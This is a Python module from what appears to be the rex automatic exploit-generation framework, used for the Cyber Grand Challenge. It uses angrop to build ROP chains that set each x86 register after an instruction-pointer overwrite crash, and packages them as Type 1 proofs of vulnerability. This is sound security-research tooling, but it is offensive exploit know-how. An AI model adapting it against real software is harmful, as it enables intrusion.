import angrop
import claripy
import logging
from rex import Vulnerability
from rex.exploit import CannotExploit
from rex.exploit.cgc import CGCType1RopExploit
from ..technique import Technique

l = logging.getLogger("rex.exploit.techniques.cgc.rop_set_register")

class RopSetRegister(Technique):
    '''
    Very CGC specific register setting technique, does a lot of special stuff to make sure the value the register is
    set to is flexible.
    '''

    name = "rop_set_register"

    applicable_to = ['cgc']

    cgc_registers = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]

    # this technique should create an exploit which is a type1 pov
    pov_type = 1

    def set_register(self, register):
        #pylint:disable=arguments-differ

        ct = self.crash.crash_type
        if ct == Vulnerability.IP_OVERWRITE or ct == Vulnerability.PARTIAL_IP_OVERWRITE:

            value_var = claripy.BVS('set_value', self.crash.project.arch.bits)
            try:
                # get a chain with a dummy value
                chain = self.rop.set_regs(**{register: value_var})
            except angrop.errors.RopException:
                raise CannotExploit("[%s] no rop chains which set the registers %s" % (self.name, register))

            _, chain_addr, _ = self._ip_overwrite_with_chain(chain)

            # the chain has to be set by our Type1Exploit, who in turn has to figure out which bytes are the
            # value so we can compile this exploit to a CGC binary

            return CGCType1RopExploit(self.crash, register, chain_addr, chain, value_var)

    def apply(self, **kwargs):

        register_setters = [ ]
        for register in RopSetRegister.cgc_registers:
            try:
                register_setters.append(self.set_register(register))
                l.info("can set register %s with rop", register)
            except CannotExploit as e:
                l.warning("unable to set register %s (%s)", register, e.message)

        return register_setters
